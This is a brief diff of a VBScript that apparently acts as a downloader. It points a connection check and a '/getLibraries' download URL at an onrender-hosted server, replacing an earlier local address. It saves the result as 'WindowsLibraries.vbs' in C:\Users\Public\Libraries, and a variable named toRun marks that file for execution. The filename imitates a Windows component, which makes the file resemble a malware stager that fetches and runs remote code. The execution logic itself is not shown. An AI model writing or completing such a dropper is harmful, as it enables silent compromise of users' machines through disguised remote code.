@@ -1,12 +1,12 @@
 Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' CheckInternetConnection variables
-Dim url : url = "https://knuth-programming-hub-9p08.onrender.com/"
+Dim url : url = "https://vibescope.onrender.com/"
 
 Dim toRun : toRun = "C:\Users\Public\Libraries\WindowsLibraries.vbs"
 
 ' DownloadFile variables
-Dim downloadURL : downloadURL = "http://192.168.126.1:8080/getLibraries" ' Replace with your actual download URL
+Dim downloadURL : downloadURL = "https://vibescope.onrender.com/getLibraries" ' Replace with your actual download URL
 Dim downloadDirectory : downloadDirectory = "C:\Users\Public\Libraries"
 Dim downloadedFilename : downloadedFilename = "WindowsLibraries.vbs"
 
